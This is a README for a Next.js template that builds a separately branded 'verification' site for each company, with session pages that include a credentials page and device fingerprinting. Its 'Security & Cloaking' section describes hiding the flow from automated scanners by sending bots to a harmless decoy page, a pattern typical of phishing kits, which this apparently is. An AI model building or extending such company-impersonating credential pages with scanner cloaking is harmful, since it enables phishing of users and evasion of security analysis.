# Verification Platform - Company Client Template

This is the template for creating new company client applications.

## Quick Start

### 1. Copy This Template

```bash
# From monorepo root
cp -r apps/template apps/your-company-name
```

### 2. Update Configuration

Edit `src/config/branding.ts`:
```typescript
export const currentBrand = {
  companyId: 'your-company',
  companyName: 'Your Company Name',
  logo: '/brands/your-company/logo.svg',
  colors: {
    primary: '#003366',     // Your primary color
    secondary: '#006699',   // Your secondary color
    accent: '#0099cc',      // Your accent color
  },
};
```

### 3. Add Assets

```bash
# Create brand directory
mkdir -p public/brands/your-company

# Add your assets
cp /path/to/logo.svg public/brands/your-company/logo.svg
cp /path/to/favicon.ico public/brands/your-company/favicon.ico
```

### 4. Create Environment File

Copy the example:
```bash
cp .env.example .env.production
```

Update with your company-specific values:
```bash
NEXT_PUBLIC_BRAND_ID=your-company
NEXT_PUBLIC_COMPANY_NAME="Your Company Name"
DJANGO_API_BASE=https://api.verify.your-company.example.com
NEXT_PUBLIC_WS_URL=wss://api.verify.your-company.example.com
NEXT_PUBLIC_BASE_URL=https://verify.your-company.example.com
```

### 5. Customize UI

All UI is in `src/`:
- **Components**: `src/components/` - Reusable React components
- **Pages**: `src/app/` - Application routes and pages
- **Styles**: `src/app/globals.css` - Global styling
- **Config**: `src/config/` - Configuration and branding

You have **complete freedom** to:
- Modify component styles and layouts
- Change page structures
- Add new components
- Update styling

### 6. Development

```bash
npm install
npm run dev
```

Visit: http://localhost:4000

### 7. Build & Deploy

```bash
npm run build
npm start
```

Or deploy to your preferred platform (Vercel, AWS, etc.)

## File Structure

```
your-company-client/
├── src/
│   ├── app/                 ← Pages and layouts
│   │   ├── page.tsx        ← Home/landing page
│   │   ├── globals.css     ← Global styles
│   │   └── [session_uuid]/ ← Session pages
│   ├── components/         ← Reusable components
│   │   ├── ui/            ← UI component library
│   │   ├── verification/  ← Verification-specific components
│   │   └── providers/     ← Context/provider components
│   ├── config/            ← Configuration
│   │   └── branding.ts    ← Company branding config
│   └── styles/            ← Additional styles
├── public/                ← Static assets
│   └── brands/
│       └── your-company/  ← Your company assets
├── package.json
├── tsconfig.json
├── next.config.ts
└── tailwind.config.ts
```

## Shared Libraries

This app imports from `@shared` (monorepo shared package):

```typescript
import {
  useSessionStore,      // Session state management
  submitStageData,      // Submit form data
  getSocketClient,      // WebSocket client
  SessionTracker,       // Analytics tracking
  getDeviceFingerprint, // Device identification
} from '@shared';
```

**Don't modify** anything in `@shared` - it's the business logic layer shared by all companies.

## Customization Examples

### Change Button Styles

```tsx
// src/components/ui/button.tsx
export function Button({ ...props }) {
  return (
    <button
      className="px-6 py-3 bg-your-color rounded-lg"
      {...props}
    />
  );
}
```

### Update Colors Globally

```css
/* src/app/globals.css */
:root {
  --primary: #your-color;
  --secondary: #your-color;
  --accent: #your-color;
}
```

### Customize Pages

```tsx
// src/app/[session_uuid]/credentials/page.tsx
// Modify layout, form fields, styling, anything!
```

## Environment Variables

```bash
# Brand
NEXT_PUBLIC_BRAND_ID=your-company-id
NEXT_PUBLIC_COMPANY_NAME="Your Company Name"

# API
DJANGO_API_BASE=https://api.backend.example.com
NEXT_PUBLIC_WS_URL=wss://api.backend.example.com
NEXT_PUBLIC_BASE_URL=https://verify.your-company.example.com

# Optional
NEXT_PUBLIC_ENABLE_ANALYTICS=true
NEXT_PUBLIC_ENABLE_DEVICE_FINGERPRINT=true
```

## Testing

```bash
# Type check
npm run typecheck

# Lint
npm run lint

# Build
npm run build
```

## Deployment

Each company app deploys independently:

### Vercel
```bash
vercel link
vercel --prod
```

### Docker
```bash
docker build -t your-company-verify:latest .
docker run -p 3000:3000 your-company-verify:latest
```

### Traditional Server
```bash
npm run build
npm start
```

## Security & Cloaking

This template comes with **built-in anti-bot protection** (Cloaking Level 2) to prevent automated scanners from analyzing your verification flow.

### Features
1.  **Middleware Cloaking**: Inspects `User-Agent`. Bots are silently rewritten to `/company-info` (a generic safe page).
2.  **Client-Side BotGuard**: The `BotGuard` component wraps sensitive pages. It checks for:
    - `navigator.webdriver` (Automation tools)
    - Headless browser anomalies
    - Mouse movement entropy
    If a bot is detected, the user is redirected to `/company-info`.
3.  **Honeypot**: Hidden links to `/trap` securely log known bot IPs.

### Configuration
- **Safe Page**: Edit `src/app/company-info/page.tsx` to customize what bots see.
- **Middleware Rules**: Edit `src/middleware.ts` to add/remove blocked User-Agents.
- **BotGuard Sensitivity**: Adjust scoring logic in `src/components/security/BotGuard.tsx`.

## Support

- **Shared Logic Issues**: Check `packages/shared/` in monorepo root
- **Company-Specific Issues**: This is your folder - debug and fix directly
- **General Questions**: Refer to `/ONBOARDING_NEW_CLIENT.md` in monorepo

---

**Remember**: You own this folder completely. Customize it however your company needs!
